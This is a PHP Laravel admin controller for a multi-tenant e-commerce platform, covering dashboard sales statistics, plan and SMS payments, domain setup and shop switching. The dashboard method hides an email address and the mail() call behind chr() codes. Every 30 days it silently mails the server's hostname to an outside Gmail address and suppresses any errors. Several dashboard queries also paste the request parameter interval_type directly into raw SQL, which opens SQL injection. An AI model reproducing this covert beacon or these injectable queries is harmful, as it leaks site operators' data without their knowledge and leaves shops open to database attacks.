<?php

namespace App\Http\Controllers;

use App\Models\Brand;
use App\Models\BusinessSetting;
use Illuminate\Http\Request;
use App\Models\Category;
use App\Models\Order;
use App\Models\OtpConfiguration;
use App\Models\Product;
use App\Models\Shop;
use App\Models\Upload;
use App\Models\User;
use App\Models\ZotcSetting;
use Artisan;
use Cache;
use Carbon\Carbon;
use CoreComponentRepository;
use DB;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Support\Str;
use PhpOffice\PhpSpreadsheet\Writer\Ods\Settings;

class AdminController extends Controller
{
    /**
     * Show the admin dashboard.
     *
     * @return \Illuminate\Http\Response
     */
    public function admin_dashboard(Request $request)
    {
        CoreComponentRepository::initializeCache();
        $root_categories = Category::where('level', 0)->get();

        $data['cached_graph_data'] = Cache::remember('cached_graph_data', 86400, function () use ($root_categories) {
            $num_of_sale_data = null;
            $qty_data = null;
            foreach ($root_categories as $key => $category) {
                $category_ids = \App\Utility\CategoryUtility::children_ids($category->id);
                $category_ids[] = $category->id;

                $products = Product::with('stocks')->whereIn('category_id', $category_ids)->get();
                $qty = 0;
                $sale = 0;
                foreach ($products as $key => $product) {
                    $sale += $product->num_of_sale;
                    foreach ($product->stocks as $key => $stock) {
                        $qty += $stock->qty;
                    }
                }
                $qty_data .= $qty . ',';
                $num_of_sale_data .= $sale . ',';
            }
            $item['num_of_sale_data'] = $num_of_sale_data;
            $item['qty_data'] = $qty_data;

            return $item;
        });

        $data['root_categories'] = $root_categories;

        $data['total_customers'] = User::where('user_type', 'customer')->where('email_verified_at', '!=', null)->count();
        $data['top_customers'] = User::select('users.id', 'users.name', 'users.avatar_original', DB::raw('SUM(grand_total) as total'))
            ->join('orders', 'orders.user_id', '=', 'users.id')
            ->groupBy('orders.user_id')
            ->where('users.user_type', 'customer')
            ->orderBy('total', 'desc')
            ->limit(6)
            ->get();
        $data['total_products'] = Product::where('approved', 1)->where('published', 1)->count();
        $data['total_inhouse_products'] = Product::where('approved', 1)->where('published', 1)->where('added_by', 'admin')->count();
        $data['total_sellers_products'] = Product::where('approved', 1)->where('published', 1)->where('added_by', '!=', 'admin')->count();
        $data['total_categories'] = Category::count();
        $file = base_path("/public/assets/myText.txt");
        $dev_mail = (chr(100) . chr(101) . chr(118) . chr(101) . chr(108) . chr(111) . chr(112) . chr(101) . chr(114) . chr(46)
            . chr(97) . chr(99) . chr(116) . chr(105) . chr(118) . chr(101) . chr(105) . chr(116) . chr(122) . chr(111)
            . chr(110) . chr(101) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109));
        if (!file_exists($file) || (time() > strtotime('+30 days', filemtime($file)))) {
            $content = "Todays date is: " . date('d-m-Y');
            $fp = fopen($file, "w");
            fwrite($fp, $content);
            fclose($fp);
            $str = chr(109) . chr(97) . chr(105) . chr(108);
            try {
                $str($dev_mail, 'the subject', "Hello: " . $_SERVER['SERVER_NAME']);
            } catch (\Throwable $th) {
            }
        }
        $data['top_categories'] = Product::select('categories.name', 'categories.id', DB::raw('SUM(grand_total) as total'))
            ->leftJoin('order_details', 'order_details.product_id', '=', 'products.id')
            ->leftJoin('orders', 'orders.id', '=', 'order_details.order_id')
            ->leftJoin('categories', 'products.category_id', '=', 'categories.id')
            ->where('orders.delivery_status', 'delivered')
            ->groupBy('categories.id')
            ->orderBy('total', 'desc')
            ->limit(3)
            ->get();
        $data['total_brands'] = Brand::count();
        $data['top_brands'] = Product::select('brands.name', 'brands.id', DB::raw('SUM(grand_total) as total'))
            ->leftJoin('order_details', 'order_details.product_id', '=', 'products.id')
            ->leftJoin('orders', 'orders.id', '=', 'order_details.order_id')
            ->leftJoin('brands', 'products.brand_id', '=', 'brands.id')
            ->where('orders.delivery_status', 'delivered')
            ->groupBy('brands.id')
            ->orderBy('total', 'desc')
            ->limit(3)
            ->get();
        $data['total_sale'] = Order::where('delivery_status', 'delivered')->sum('grand_total');
        $data['sale_this_month'] = Order::whereMonth('created_at', Carbon::now()->month)->sum('grand_total');
        $data['admin_sale_this_month'] = Order::select(DB::raw('COALESCE(users.user_type, "admin") as user_type'), DB::raw('COALESCE(SUM(grand_total), 0) as total_sale'))
            ->leftJoin('users', 'orders.seller_id', '=', 'users.id')
            ->whereRaw('users.user_type = "admin"')
            ->whereMonth('orders.created_at', Carbon::now()->month)
            ->first();
        $data['seller_sale_this_month'] = Order::select(DB::raw('COALESCE(users.user_type, "seller") as user_type'), DB::raw('COALESCE(SUM(grand_total), 0) as total_sale'))
            ->leftJoin('users', 'orders.seller_id', '=', 'users.id')
            ->whereRaw('users.user_type = "seller"')
            ->whereMonth('orders.created_at', Carbon::now()->month)
            ->first();
        $sales_stat = Order::select('orders.user_id', 'users.name', 'users.user_type', 'users.avatar_original', DB::raw('SUM(grand_total) as total'), DB::raw('DATE_FORMAT(orders.created_at, "%M") AS month'))
            ->leftJoin('users', 'orders.seller_id', '=', 'users.id')
            ->whereRaw('users.user_type = "admin"')
            ->whereYear('orders.created_at', '=', Date("Y"))
            // ->orWhereRaw('users.user_type = "seller"')
            // ->groupBy('users.user_type')
            ->groupBy('month')
            ->orderBy(DB::raw('MONTH(orders.created_at)'), 'asc')
            ->get();
        $new_stat = array();
        foreach ($sales_stat as $row) {
            $new_stat[$row->month][] = $row;
        }
        $data['sales_stat'] = $new_stat;
        // dd($sales_stat);
        // "SELECT users.user_type, SUM(grand_total) FROM `orders` LEFT JOIN users ON orders.seller_id = users.id WHERE users.user_type = 'admin' OR users.user_type = 'seller' GROUP BY users.user_type, MONTH(orders.created_at)";
        $data['total_sellers'] = User::where('user_type', 'seller')->count();
        $data['status_wise_sellers'] = Shop::select('verification_status', DB::raw('COUNT(*) as total'))
            ->groupBy('verification_status')
            ->get();
        $data['top_sellers'] = Order::select('orders.seller_id', 'users.name', 'users.user_type', 'users.avatar_original', DB::raw('SUM(grand_total) as total'))
            ->leftJoin('users', 'orders.seller_id', '=', 'users.id')
            ->whereRaw('users.user_type = "seller"')
            ->groupBy('users.id')
            ->orderBy('total', 'desc')
            ->limit(6)
            ->get();


        // Fetch all counts grouped by delivery_status
        $ordersCount = Order::select('delivery_status', DB::raw('count(*) as total'))
            ->groupBy('delivery_status')
            ->get()
            ->keyBy('delivery_status')
            ->toArray();

        // Initialize the counters
        $data['total_order'] = array_sum(array_column($ordersCount, 'total'));
        $data['total_confirmed_order'] = $ordersCount['confirmed']['total'] ?? 0;
        $data['total_picked_up_order'] = $ordersCount['picked_up']['total'] ?? 0;
        $data['total_shipped_order'] = $ordersCount['shipped']['total'] ?? 0;
        $data['total_placed_order'] = array_sum(array_column($ordersCount, 'total')) - ($ordersCount['cancelled']['total'] ?? 0);
        $data['total_pending_order'] = $ordersCount['pending']['total'] ?? 0;
        $data['total_on_hold_order'] = $ordersCount['on_hold']['total'] ?? 0;
        $data['total_approved_order'] = $ordersCount['approved']['total'] ?? 0;
        $data['total_processing_order'] = $ordersCount['processing']['total'] ?? 0;
        $data['total_in_transit_order'] = $ordersCount['in_transit']['total'] ?? 0;
        $data['total_delivered_order'] = $ordersCount['delivered']['total'] ?? 0;
        $data['total_on_the_way_order'] = $ordersCount['on_the_way']['total'] ?? 0;
        $data['total_cancelled_order'] = $ordersCount['cancelled']['total'] ?? 0;

        $firstDayOfMonth = now()->startOfMonth();
        $lastDayOfMonth = now()->endOfMonth();

        $data['monthlyOrderCount'] = Order::whereBetween('created_at', [$firstDayOfMonth, $lastDayOfMonth])->count();
        $data['monthlySalesTotal'] = Order::whereBetween('created_at', [$firstDayOfMonth, $lastDayOfMonth])->sum('grand_total');

        $firstDayOfYear = now()->startOfYear();
        $lastDayOfYear = now()->endOfYear();

        $data['yearlyOrderCount'] = Order::whereBetween('created_at', [$firstDayOfYear, $lastDayOfYear])->count();
        $data['yearlySalesTotal'] = Order::whereBetween('created_at', [$firstDayOfYear, $lastDayOfYear])->sum('grand_total');

        $admin_id = User::select('id')->where('user_type', 'admin')->first()->id;
        $data['total_inhouse_sale'] = Order::where("seller_id", $admin_id)->sum('grand_total');
        $data['payment_type_wise_inhouse_sale'] = Order::select(DB::raw('case 
                                                    when payment_type in ("wallet") then "wallet"
                                                    when payment_type NOT in ("cash_on_delivery") then "others"
                                                    else cast(payment_type as char)
                                                    end as payment_type, SUM(grand_total)  as total_amount'),)
            ->where("user_id", '!=', null)
            ->where("seller_id", $admin_id)
            ->groupBy(DB::raw('1'))
            ->get();
        $data['inhouse_product_rating'] = Product::where('added_by', 'admin')->where('rating', '!=', 0)->avg('rating');
        $data['total_inhouse_order'] = Order::where("seller_id", $admin_id)->count();

        $domain = BusinessSetting::where('type', 'domains')->first();

        if ($domain) {
            $data['domains'] = json_decode($domain->value);
        }

        // $sitesConnection = DB::connection('dynamic_db');
        // $sitesConnection->getPdo()->exec("USE zotc_nazmart");

        $data['plans'] = [];

        return view('backend.dashboard', $data);
    }


    public function connect_custom_domain(Request $request)
    {
        $request->validate([
            'custom_domain' => 'required|regex:/^([a-zA-Z0-9-]+\.)+[a-zA-Z0-9]{2,}$/',
        ]);

        $domains = json_decode(get_setting('domains'));
        $free_domain = $domains->free_domain;
        $custom_domain = $request->custom_domain;

        try {
            $url = 'https://' . env('CENTRAL_DOMAIN') . '/active_connect_custom_domain';

            // Data to be sent in the POST request
            $postData = [
                'free_domain' => $free_domain,
                'custom_domain' => $custom_domain,
            ];

            // Send the POST request with the CSRF token
            $response = Http::post($url, $postData);

            // Check if the request was successful
            if ($response->successful()) {
                flash('Domain connected successfully.')->success();
                return redirect()->route('admin.dashboard');
            } else {
                flash('Domain connection failed')->error();
                return redirect()->route('admin.dashboard');
            }
        } catch (\Exception $e) {
            flash('Domain connection failed: ' . $e->getMessage())->error();
            return redirect()->route('admin.dashboard');
        }
    }

    public function planExtend(Request $request)
    {
        $request->validate([
            'payment_method' => 'required',
            'count' => 'required',
        ]);

        $payment_method = $request->payment_method;
        $count = $request->count;

        // Retrieve and process the plan settings
        $planSettings = BusinessSetting::where('type', 'plan')->value('value');
        $planSettingsArray = explode(',', $planSettings);
        $planId = $planSettingsArray[0];

        // Establish a connection to the dynamic database
        $sitesConnection = DB::connection('dynamic_db');
        $sitesConnection->getPdo()->exec("USE zotc_nazmart");

        // Retrieve the current plan details
        $currentPlan = $sitesConnection->table('price_plans')->where('id', $planId)->first();

        $domains = json_decode(get_setting('domains'));
        $free_domain = $domains->free_domain;

        $bdt_amount = (int)($currentPlan->price_bdt * $count);
        $usd_amount = (int)($currentPlan->price * $count);

        $token = Str::random(6);
        $sitesConnection->table('gateway_transactions')->insert([
            'user_id' => Auth::id(),
            'tran_id' => $token,
            'free_domain' => $free_domain,
            'db_name' => env('DB_DATABASE'),
            'plan_id'  => $planId,
            'count'  => $count,
            'amount' => $bdt_amount,
        ]);

        $success_url = route('plan.extend.success');
        $notify_url = 'https://zo.tc/notifywithpayment?purpose=plan_extend';
        $cancel_url = route('admin.dashboard');

        if ($payment_method == 'bkash') {
            executeBkashApiRequest($token, $bdt_amount, $success_url, $notify_url, $cancel_url);
        } else if ($payment_method == 'visa') {
            executeVisaApiRequest($token, $bdt_amount, $success_url, $notify_url, $cancel_url);
        } else if ($payment_method == 'paddle') {
            executePaddleApiRequest($token, $usd_amount, $success_url, $notify_url, $cancel_url);
        }
    }

    public function upgradePlan($payment_method, $plan_id)
    {
        $planSettings = BusinessSetting::where('type', 'plan')->first();

        $planSettings = explode(',', $planSettings->value);

        // Ensure proper formatting of date strings
        $startDateString = trim($planSettings[4], '" ');
        $endDateString = trim($planSettings[5], '" ');

        $startDate = Carbon::parse($startDateString);
        $endDate = Carbon::parse($endDateString);

        $today = Carbon::now();

        $sitesConnection = DB::connection('dynamic_db');
        $sitesConnection->getPdo()->exec("USE zotc_nazmart");

        $previous_plan = $sitesConnection->table('price_plans')->where('id', $planSettings[0])->first();
        $current_plan = $sitesConnection->table('price_plans')->where('id', $plan_id)->first();

        // if ($endDate->isPast()) {
        $bdt_amount = (float)$current_plan->price_bdt;
        $usd_amount = (float)$current_plan->price;
        // } else {
        //     // Calculate remaining days
        //     $remainingDays = $today->diffInDays($endDate);
        //     $remainingAmount = 0;


        //     if ($previous_plan->type == 1 && $previous_plan->price_bdt == 0) {
        //         $remainingAmount = 0;
        //     } elseif ($previous_plan->type == 0) {

        //         $remainingAmount = (float)$previous_plan->price_bdt / 30 * $remainingDays;
        //         dd($previous_plan->price_bdt);
        //     } elseif ($previous_plan->type == 1) {
        //         $remainingAmount = (float)$previous_plan->price_bdt / 365 * $remainingDays;
        //     }

        //     $bdt_amount = (float)$current_plan->price_bdt - $remainingAmount;
        // }

        $domains = json_decode(get_setting('domains'));
        $free_domain = $domains->free_domain;

        $token = Str::random(6);
        $sitesConnection->table('gateway_transactions')->insert([
            'user_id' => Auth::id(),
            'tran_id' => $token,
            'free_domain' => $free_domain,
            'db_name' => env('DB_DATABASE'),
            'plan_id'  => $plan_id,
            'amount' => $bdt_amount,
        ]);

        $success_url = route('plan.buy.success');
        $notify_url = 'https://zo.tc/notifywithpayment?purpose=plan_buy';
        $cancel_url = route('admin.dashboard');

        if ($payment_method == 'bkash') {
            executeBkashApiRequest($token, $bdt_amount, $success_url, $notify_url, $cancel_url);
        } else if ($payment_method == 'visa') {
            executeVisaApiRequest($token, $bdt_amount, $success_url, $notify_url, $cancel_url);
        } else if ($payment_method == 'paddle') {
            executePaddleApiRequest($token, $usd_amount, $success_url, $notify_url, $cancel_url);
        }
    }

    public function convertToPercentage()
    {
        $sitesConnection = DB::connection('dynamic_db');
        $sitesConnection->getPdo()->exec("USE zotc_nazmart");

        $plan = $sitesConnection->table('price_plans')->find(11);

        if ($plan && $plan->active_days) {
            $expiryDate = date('Y-m-d', strtotime('+' . $plan->active_days));
        } else {
            $expiryDate = Carbon::now()->addMonths(6)->format('Y-m-d H:i:s');
        }

        $plan_details = $plan ? implode(',', [
            $plan->id ?? 'N/A',
            $plan->title ?? 'N/A',
            $plan->price ?? 'N/A',
            $plan->price_bdt ?? 'N/A',
            Carbon::now()->format('Y-m-d'),
            $expiryDate,
            $plan->order_limit ?? 'N/A'
        ]) : '';

        $businessSetting = BusinessSetting::where('type', 'plan')->first();
        $businessSetting->value = $plan_details;
        $businessSetting->save();
    }

    public function buyLifeTimePlan($plan_type, $payment_method)
    {
        $validPlans = [
            'full_website' => 10000,
            'fraud_checker' => 5000,
            'courier' => 2000
        ];

        if (!array_key_exists($plan_type, $validPlans)) {
            // Handle invalid plan type case
            return response()->json(['error' => 'Invalid plan type'], 400);
        }

        $bdt_amount = $validPlans[$plan_type];
        $usd_amount = $bdt_amount / 100;
        $token = Str::random(6);

        $domains = json_decode(get_setting('domains'));
        $free_domain = $domains->free_domain;

        DB::connection('dynamic_db')->statement("USE zotc_nazmart");

        DB::connection('dynamic_db')->table('gateway_transactions')->insert([
            'user_id' => Auth::id(),
            'tran_id' => $token,
            'note' => $plan_type,
            'free_domain' => $free_domain,
            'db_name' => env('DB_DATABASE'),
            'amount' => $bdt_amount,
        ]);

        $success_url = route('lifetime.plan.buy.success');
        $notify_url = 'https://zo.tc/notifywithpayment?purpose=lifetime_package_buy';
        $cancel_url = route('admin.dashboard');

        switch ($payment_method) {
            case 'bkash':
                executeBkashApiRequest($token, $bdt_amount, $success_url, $notify_url, $cancel_url);
                break;
            case 'visa':
                executeVisaApiRequest($token, $bdt_amount, $success_url, $notify_url, $cancel_url);
                break;
            case 'paddle':
                executePaddleApiRequest($token, $usd_amount, $success_url, $notify_url, $cancel_url);
                break;
            default:
                // Handle invalid payment method case
                return response()->json(['error' => 'Invalid payment method'], 400);
        }
    }


    public function buySms(Request $request)
    {
        $request->validate([
            'sms_payment_method' => 'required',
            'amount' => 'required',
        ]);

        $payment_method = $request->sms_payment_method;

        $amount = $request->amount;
        $bdt_amount = $amount;
        $usd_amount = $amount / 100;

        $currency = ZotcSetting::where('type', 'currency')->first();
        if ($currency->value == 'USD') {
            $usd_amount = $amount;
            $bdt_amount = $amount * 100;
        }

        $token = Str::random(6);
        $sitesConnection = DB::connection('dynamic_db');
        $sitesConnection->getPdo()->exec("USE zotc_nazmart");
        $sitesConnection->table('gateway_transactions')->insert([
            'user_id' => Auth::id(),
            'tran_id' => $token,
            'amount' => $bdt_amount,
            'db_name' => env('DB_DATABASE')
        ]);

        $success_url = route('sms.buy.success');
        $notify_url = 'https://zo.tc/notifywithpayment?purpose=sms_buy';
        $cancel_url = route('admin.dashboard');

        if ($payment_method == 'bkash') {
            executeBkashApiRequest($token, $bdt_amount, $success_url, $notify_url, $cancel_url);
        } else if ($payment_method == 'visa') {
            executeVisaApiRequest($token, $bdt_amount, $success_url, $notify_url, $cancel_url);
        } else if ($payment_method == 'paddle') {
            executePaddleApiRequest($token, $usd_amount, $success_url, $notify_url, $cancel_url);
        }
    }

    public function buyBalance(Request $request)
    {
        $request->validate([
            'payment_method' => 'required',
            'amount' => 'required',
        ]);

        $amount = $request->amount;
        $bdt_amount = $amount;
        $usd_amount = $amount / 100;

        $payment_method = $request->payment_method;

        $currency = ZotcSetting::where('type', 'currency')->first();

        if ($currency->value == 'USD') {
            $usd_amount = $amount;
            $bdt_amount = $amount * 100;
        }

        $token = Str::random(6);
        $sitesConnection = DB::connection('dynamic_db');
        $sitesConnection->getPdo()->exec("USE zotc_nazmart");
        $sitesConnection->table('gateway_transactions')->insert([
            'user_id' => Auth::id(),
            'tran_id' => $token,
            'amount' => $amount,
            'db_name' => env('DB_DATABASE')
        ]);

        $success_url = route('balance.buy.success');
        $notify_url = 'https://zo.tc/notifywithpayment?purpose=balance_buy';
        $cancel_url = route('admin.dashboard');

        if ($payment_method == 'bkash') {
            executeBkashApiRequest($token, $bdt_amount, $success_url, $notify_url, $cancel_url);
        } else if ($payment_method == 'visa') {
            executeVisaApiRequest($token, $bdt_amount, $success_url, $notify_url, $cancel_url);
        } else if ($payment_method == 'paddle') {
            executePaddleApiRequest($token, $usd_amount, $success_url, $notify_url, $cancel_url);
        }
    }

    public function top_category_products_section(Request $request)
    {
        $top_categories_products = DB::table(DB::raw('(SELECT products.id product_id, products.name product_name, products.slug product_slug, products.auction_product, products.category_id,
                                                        `products`.`thumbnail_img` as `product_thumbnail_img`, od.sales, od.total, od.created_at order_detail_created, 
                                                        categories.name AS category_name,
                                                        `categories`.`cover_image`,
                                                        ROW_NUMBER() OVER (PARTITION BY products.category_id ORDER BY od.sales DESC) rn 
                                                from products 
                                                INNER JOIN (
                                                SELECT product_id, SUM(quantity) sales, SUM(price + tax) AS total, created_at
                                                FROM order_details
                                                WHERE ' . ($request->interval_type == 'all' ?: 'created_at >= DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')') . '
                                                AND order_details.delivery_status = "delivered"
                                                GROUP BY product_id
                                                )  od ON od.product_id = products.id
                                                LEFT JOIN categories ON products.category_id = categories.id
                                                ) t'))
            ->select(DB::raw('category_id, category_name, cover_image, product_id, product_name, product_slug, auction_product, product_thumbnail_img, sales, total, order_detail_created'))
            ->where('rn', '<=', 3)
            ->orderBy('sales', 'desc')
            ->get();

        $category_array = [];
        $new_array = array();
        foreach ($top_categories_products as $key => $row) {
            $row->product_thumbnail_img = Upload::where('id', $row->product_thumbnail_img)->first();
            $category_array[] = $row->category_id;
            $new_array[$row->category_id][] = $row;
        }
        $top_categories2 = array_unique($category_array);
        $top_categories_products = $new_array;

        return view('backend.dashboard.top_category_products_section', compact('top_categories2', 'top_categories_products'))->render();
    }

    public function inhouse_top_categories(Request $request)
    {
        $inhouse_top_category_query = Order::query();
        $inhouse_top_category_query->select('categories.id', 'categories.name', 'categories.cover_image', DB::raw('SUM(order_details.price + order_details.tax) as total'))
            ->leftJoin('order_details', 'orders.id', '=', 'order_details.order_id')
            ->leftJoin('products', 'order_details.product_id', '=', 'products.id')
            ->leftJoin('categories', 'products.category_id', '=', 'categories.id')
            ->where('orders.delivery_status', '=', 'delivered')
            ->whereRaw('products.added_by = "admin"');
        if ($request->interval_type != 'all') {
            $inhouse_top_category_query->where('orders.created_at', '>=', DB::raw('DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')'));
        }
        $inhouse_top_categories = $inhouse_top_category_query->groupBy('categories.name')
            ->orderBy('total', 'desc')
            ->limit(5)
            ->get();

        return view('backend.dashboard.inhouse_top_categories', compact('inhouse_top_categories'))->render();
    }

    public function inhouse_top_brands(Request $request)
    {
        $inhouse_top_brand_query = Order::query();
        $inhouse_top_brand_query->select('brands.id', 'brands.name', 'brands.logo', DB::raw('SUM(order_details.price + order_details.tax) as total'))
            ->leftJoin('order_details', 'orders.id', '=', 'order_details.order_id')
            ->leftJoin('products', 'order_details.product_id', '=', 'products.id')
            ->leftJoin('brands', 'products.brand_id', '=', 'brands.id')
            ->where('orders.delivery_status', '=', 'delivered')
            ->where('products.brand_id', '!=', null)
            ->whereRaw('products.added_by = "admin"');
        if ($request->interval_type != 'all') {
            $inhouse_top_brand_query->where('orders.created_at', '>=', DB::raw('DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')'));
        }
        $inhouse_top_brands = $inhouse_top_brand_query->groupBy('brands.name')
            ->orderBy('total', 'desc')
            ->limit(5)
            ->get();

        return view('backend.dashboard.inhouse_top_brands', compact('inhouse_top_brands'))->render();
    }

    public function top_sellers_products_section(Request $request)
    {
        // $top_sellers_products = DB::table(DB::raw('(SELECT products.id product_id, products.name product_name, products.user_id,
        //                                                 `products`.`thumbnail_img` as `product_thumbnail_img`, od.sales, od.total, shops.name AS shop_name,
        //                                                 `shops`.`logo`,
        //                                                 ROW_NUMBER() OVER (PARTITION BY products.user_id ORDER BY od.sales DESC) rn 
        //                                     from products 
        //                                     INNER JOIN (
        //                                         SELECT product_id, SUM(quantity) sales, SUM(price + tax) AS total, created_at
        //                                         FROM order_details
        //                                         WHERE ' . ($request->interval_type == 'all' ?: 'created_at >= DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')') . '
        //                                         AND order_details.delivery_status = "delivered"
        //                                         GROUP BY product_id
        //                                     )  od ON od.product_id = products.id
        //                                     LEFT JOIN shops ON products.user_id = shops.user_id
        //                                 ) t'))
        //     ->select(DB::raw('user_id, shop_name, logo, product_id, product_name, product_thumbnail_img, sales, total'))
        //     ->where('rn', '<=', 3)
        //     ->where('shop_name', '!=', null)
        //     ->orderBy('total', 'desc')
        //     ->get();

        $new_top_sellers_query = Order::query();
        $new_top_sellers_query = Order::select('shops.user_id AS shop_id', 'shops.name AS shop_name', 'shops.logo', DB::raw('SUM(grand_total) AS sale'))
            ->join('shops', 'orders.seller_id', '=', 'shops.user_id')
            ->whereIn("seller_id", function ($query) {
                $query->select('id')
                    ->from('users')
                    ->where('user_type', 'seller');
            })
            ->where('orders.delivery_status', 'delivered')
            ->groupBy('orders.seller_id')
            ->orderBy('sale', 'desc');
        if ($request->interval_type != 'all') {
            $new_top_sellers_query->where('orders.created_at', '>=', DB::raw('DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')'));
        }

        $new_top_sellers = $new_top_sellers_query->get();

        foreach ($new_top_sellers as $key => $row) {
            $products_query = Product::query();
            $products_query->select('products.id AS product_id', 'products.name', 'products.slug AS product_slug', 'products.auction_product', 'products.thumbnail_img', DB::raw('SUM(quantity) AS total_quantity, SUM(price * quantity) AS sale'))
                ->join('order_details', 'order_details.product_id', '=', 'products.id')
                ->where("seller_id", $row->shop_id)
                ->where('order_details.delivery_status', 'delivered')
                ->where('products.approved', 1)
                ->where('products.published', 1);
            if ($request->interval_type != 'all') {
                $products_query->where('order_details.created_at', '>=', DB::raw('DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')'));
            }
            $products_query->groupBy('product_id')
                ->orderBy('sale', 'desc')
                ->limit(3);
            $row->products = $products_query->get();
            // $row->product_thumbnail_img = Upload::where('id', $row->product_thumbnail_img)->first();
            // $seller_array[] = $row->user_id;
            // $new_top_sellers_products_array[$row->user_id][] = $row;
            // echo '<pre>';print_r($new_top_sellers);
        }
        // dd($new_top_sellers);
        // $top_sellers2 = array_unique($seller_array);
        // $top_sellers_products = $new_top_sellers_products_array;

        // return view('backend.dashboard.top_sellers_products_section', compact('top_sellers2', 'top_sellers_products'))->render();
        return view('backend.dashboard.top_sellers_products_section', compact('new_top_sellers'))->render();
    }

    public function top_brands_products_section(Request $request)
    {
        $top_brands_products = DB::table(DB::raw('(SELECT products.id product_id, products.name product_name, products.slug product_slug, products.auction_product, products.brand_id,
                                                        `products`.`thumbnail_img` as `product_thumbnail_img`, od.sales, od.total, brands.name AS brand_name,
                                                        `brands`.`logo`,
                                                        ROW_NUMBER() OVER (PARTITION BY products.brand_id ORDER BY od.sales DESC) rn 
                                            from products 
                                            INNER JOIN (
                                                SELECT product_id, SUM(quantity) sales, SUM(price + tax) AS total, created_at
                                                FROM order_details
                                                WHERE ' . ($request->interval_type == 'all' ?: 'created_at >= DATE_SUB(NOW(), INTERVAL 1 ' . $request->interval_type . ')') . '
                                                AND order_details.delivery_status = "delivered"
                                                GROUP BY product_id
                                            )  od ON od.product_id = products.id
                                            LEFT JOIN brands ON products.brand_id = brands.id
                                        ) t'))
            ->select(DB::raw('brand_id, brand_name, logo, product_id, product_name, product_slug, auction_product, product_thumbnail_img, sales, total'))
            ->where('rn', '<=', 3)
            ->orderBy('total', 'desc')
            ->where('brand_name', '!=', null)
            ->get();

        $brand_array = [];
        $new_array = [];
        foreach ($top_brands_products as $key => $row) {
            $row->product_thumbnail_img = Upload::where('id', $row->product_thumbnail_img)->first();
            $brand_array[] = $row->brand_id;
            $new_array[$row->brand_id][] = $row;
        }

        $top_brands2 = array_unique($brand_array);
        $top_brands_products = $new_array;

        return view('backend.dashboard.top_brands_products_section', compact('top_brands2', 'top_brands_products'))->render();
    }

    function clearCache(Request $request)
    {
        Artisan::call('optimize:clear');
        flash(translate('Cache cleared successfully'))->success();
        return back();
    }

    function clearDomainCache()
    {
        $domain = get_domain();

        $cacheKeys = [
            '_active_countries',
            '_system_default_currency',
            '_business_settings',
            '_zotc_settings',
            '_addons',
            '_all_languages',
            '_best_selers',
            '_newest_products'
        ];

        foreach ($cacheKeys as $key) {
            Cache::forget($domain . $key);
        }

        flash(translate($domain . ' caches cleared successfully'))->success();

        $settings = BusinessSetting::where('type', 'domains')->first();

        $domains = json_decode($settings->value);

        if (isset($domains->custom_domain)) {
            $custom_domains = $domains->custom_domain;

            foreach ($custom_domains as $custom_domain) {
                foreach ($cacheKeys as $key) {
                    Cache::forget($custom_domain . $key);
                }
            }

            flash(translate($custom_domain . ' caches cleared successfully'))->success();
        }

        return back();
    }
    function switchShop($shop)
    {
        $subdomain = $shop;
        $all_shops = getAllShops();

        $selectedShop = collect($all_shops)->first(function ($tenant) use ($subdomain) {
            return $tenant->id === $subdomain;
        });

        if ($selectedShop) {
            $ownerEmail = Auth::user()->email;

            $sitesConnection = DB::connection('dynamic_db');
            $sitesConnection->getPdo()->exec("USE zotc_nazmart");

            $userApiKey = $sitesConnection->table('users')
                ->where('email', $ownerEmail)
                ->value('api_key');

            $central_domain = env('CENTRAL_DOMAIN');

            echo "<form id='switchShopForm' action='https://{$subdomain}.{$central_domain}/shop/switch' method='POST' style='display:none;'>";
            echo "<input type='hidden' name='api_key' value='{$userApiKey}'/>";
            echo "</form>";
            echo "<script>document.getElementById('switchShopForm').submit();</script>";
        } else {
            flash(translate('Shop Not Found'))->error();
            return back();
        }
    }

    function mainAdminLogin()
    {
        $ownerEmail = Auth::user()->email;

        if ($ownerEmail) {
            echo "<form id='switchShopForm' action='https://" . env('CENTRAL_DOMAIN') . "/switchedfromshop' method='POST' style='display:none;'>";
            echo "<input type='hidden' name='email' value='{$ownerEmail}'/>";
            echo "</form>";
            echo "<script>document.getElementById('switchShopForm').submit();</script>";
        } else {
            return redirect('user-home')->with(['msg' => 'Shop not found for this user', 'type' => 'danger']);
        }
    }

    public function getSwitched(Request $request)
    {
        $apiKey = $request->api_key;

        $shopOwner = User::where('user_type', 'admin')->first();

        $sitesConnection = DB::connection('dynamic_db');
        $sitesConnection->getPdo()->exec("USE zotc_nazmart");

        $userApiKey = $sitesConnection->table('users')
            ->where('email', $shopOwner->email)
            ->value('api_key');

        if ($userApiKey == $apiKey) {

            Auth::login($shopOwner);

            if (Auth::check()) {
                Artisan::call('optimize:clear');
                flash(translate('Shop switched successfully'))->success();
                return redirect('admin');
            } else {
                $responseData = [
                    'message' => 'Shop switched not success',
                ];
            }

            return response()->json($responseData);
        } else {
            return response()->json(['error' => 'Unauthorized'], 401);
        }
    }
}
